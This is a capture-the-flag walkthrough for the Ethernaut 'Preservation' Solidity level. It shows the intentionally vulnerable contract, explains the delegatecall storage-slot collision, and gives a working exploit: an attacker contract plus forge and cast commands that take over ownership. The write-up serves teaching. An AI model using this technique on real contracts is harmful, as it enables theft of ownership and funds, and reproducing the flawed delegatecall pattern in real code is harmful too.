## Preservation Level Outline

**Difficulty : 8/10**

This contract utilizes a library to store two different times for two different timezones. The constructor creates two instances of the library for each time to be stored.

The goal of this level is for you to claim ownership of the instance you are given.

```solidity  
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Preservation {

  // public library contracts 
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner; 
  uint storedTime;
  // Sets the function signature for delegatecall
  bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) public {
    timeZone1Library = _timeZone1LibraryAddress; 
    timeZone2Library = _timeZone2LibraryAddress; 
    owner = msg.sender;
  }
 
  // set the time for timezone 1
  function setFirstTime(uint _timeStamp) public {
    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }

  // set the time for timezone 2
  function setSecondTime(uint _timeStamp) public {
    timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }
}

// Simple library contract to set the time
contract LibraryContract {

  // stores a timestamp 
  uint storedTime;  

  function setTime(uint _time) public {
    storedTime = _time;
  }
}
```

[Link to level on Ethernaut](https://ethernaut.openzeppelin.com/level/0x97E982a15FbB1C28F6B8ee971BEc15C78b3d263F)

## Solution

When a contract makes a function call using delegatecall it loads the function code from another contract and executes it as if it were its own code. 

This means that when we make a delegatecall to `timeZone1Library`, we are modifying storage slot 0 in Preservation. If we change this to point to a malicious contract, we can then create a spoof function for "setTime(uint256)" and change the owner.

### Walkthrough

##### 1. Create a new [forge project](https://book.getfoundry.sh/projects/creating-a-new-project.html) with the following contract in `src` 
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract Contract {
    uint256 storageSlot0;
    uint256 storageSlot1;
    uint256 attack_this_slot;

    function setTime(uint256 newOwner) public {
        attack_this_slot = newOwner;
    }
}
```

##### 2. Deploy our new contract
```console
forge create src/Contract.sol:Contract --private-key  $PRIVATE_KEY
```

##### 3. Changing storage slot 0 to point to our malicious contract
```console
cast send $LEVEL_ADDRESS "setFirstTime(uint)" $DEPLOYED_ADDRESS --private-key $PRIVATE_KEY
```
> Replace $DEPLOYED_ADDRESS with the address of your deployed contract

##### 4. Calling our exploited contract through the delegatecall and passing our address as the owner
```console
cast send $LEVEL_ADDRESS "setFirstTime(uint)" $NEW_OWNER --gas 60000 --private-key $PRIVATE_KEY
```
> Replace $NEW_OWNER with your EOA address 


---

##### [:arrow_left: Back To Main Menu](../README.md)
